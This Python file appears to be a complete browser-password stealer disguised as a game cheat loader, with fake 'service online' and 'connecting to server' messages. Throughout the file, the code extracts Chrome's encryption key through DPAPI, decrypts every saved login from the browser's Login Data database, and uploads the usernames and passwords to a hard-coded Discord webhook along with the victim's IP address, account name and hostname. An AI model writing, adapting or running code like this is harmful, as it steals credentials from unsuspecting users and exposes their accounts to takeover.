import dhooks
from dhooks import Webhook, Embed
import os
import socket
import datetime
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import requests
import discord
import subprocess
import time
import psutil
import random

webhook_url = "https://discord.com/api/webhooks/1174044662416298044/17FP9U_i7dEV7-e9cFSHuQIVjBP7F7o35gauJJGlP0LA81haMtxcUWx40f76Gnmt4-WE"
hook = dhooks.Webhook(webhook_url)




#ENSURE MODULES ARE INSTALLED
def install_modules():
    modules_to_import = ["random", "dhooks", "Webhook", "Embed", "os", "socket", "datetime", "re", "sys", "json", "base64", "sqlite3" ,"win32crypt", "cryptodome", "AES", "shutil", "csv", "requests", "discord", "subprocess", "time", "psutil"]

    for module_name in modules_to_import:
        try:
            # Run a Python script that imports the current module
            subprocess.run(['python', '-c', f'import {module_name}'], check=True)
        except subprocess.CalledProcessError as e:
            pass
        except ModuleNotFoundError as e:
            print("Unable to connect to server. ")
        except Exception as e:
            pass

#MAIN VARIABLES
user_pc_username = os.environ['USERNAME']
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
time_now = datetime.datetime.now()

#FILE PATHS
temp_file_path = (f"C:\\temp")
temp_path = os.path.join(temp_file_path, "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=20)))
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
localappdata = os.getenv("localappdata")


__CONFIG__ = {
    "service_online": True,

    "ping": True,
    "systeminfo": True,


    "selfdestruct": False,
    "fakeerror": False,
    "injection": False


}

def error_message():
    print("[-] Unable to connect to server. If this issue re-occurs, contact support.")


def automatic_checks():
    def start_check():
        if __CONFIG__["service_online"]:
            print("[+] Service is ONLINE. Connecting to server...")
            time.sleep(random.randint(1,6))
            os.system("CLS")
        else:
            print("[-] Service is currently OFFLINE. Check discord for updates.")
            a = input("")


    def create_path():
        if temp_file_path:
            os.mkdir(temp_path)
        else:
            error_message()

    def check_if_noottrof_on():
        for process in psutil.process_iter(['pid', 'name']):
            if process.info['name'] == 'Spotify.exe':
                return True
        return False
    

    #CALL FUNCTIONS
    start_check()
    create_path()
    check_if_noottrof_on()


    if check_if_noottrof_on():
        print("[-] Ensure F0RTN1T3 is fully closed before opening the loader.")
        a = input("")
        exit()
    else:
        pass

def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        pass
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        pass


def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        pass

def convert_csv_to_txt(csv_filename, txt_filename):
    try:
        with open(csv_filename, 'r') as csv_file:
            # Read the content of the CSV file
            csv_content = csv_file.read()

            with open(txt_filename, 'w') as txt_file:
                # Write the content to the text file
                txt_file.write(csv_content)
                
    except Exception as e:
        pass

def write_to_csv():
    #Create Dataframe to store passwords
    with open(f'{temp_path}\\decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
        csv_writer = csv.writer(decrypt_password_file, delimiter=',')
        csv_writer.writerow(["index""   ""url""   ""username""   ""password"])
        #(1) Get secret key
        secret_key = get_secret_key()
        #Search user profile or default folder (this is where the encrypted login password is stored)
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
        for folder in folders:
            #(2) Get ciphertext from sqlite database
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
            conn = get_db_connection(chrome_path_login_db)
            if(secret_key and conn):
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index,login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if(url!="" and username!="" and ciphertext!=""):
                        #(3) Filter the initialisation vector & encrypted password from ciphertext 
                        #(4) Use AES algorithm to decrypt the password
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        #(5) Save into CSV 
                        csv_writer.writerow([index,"   ",url,"   ",username,"   ",decrypted_password])

                            
                #Close database connection
                cursor.close()
                conn.close()
                #Delete temp login db
                os.remove("Loginvault.db")  

def clear():
    if os.path.exists(temp_path):
        os.removedirs











def loader_order():
    automatic_checks()


def connect_to_server():
    #UPLOAD FILEPATH
    emoji = '🔥'
    final_file_path = (f'{temp_path}\\temp.txt')
    with open(final_file_path, "r", encoding="utf-8") as file:
        content = file.read()

    embed = Embed(
        description = f"""
        📈IP: {ip_address}
        💻PUser: {user_pc_username}
        📡Hostname: {hostname}
        """,
        timestamp = f'{time_now}'
        )

    if __CONFIG__["ping"]:
        ping = '@everyone'
    else:
        ping = ''

    hook.send(ping, embed=embed, file=dhooks.File(final_file_path, name = os.path.join("".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=5))) + ".txt"))

automatic_checks()
write_to_csv()
convert_csv_to_txt(f'{temp_path}\\decrypted_password.csv', f'{temp_path}\\temp.txt')
connect_to_server()
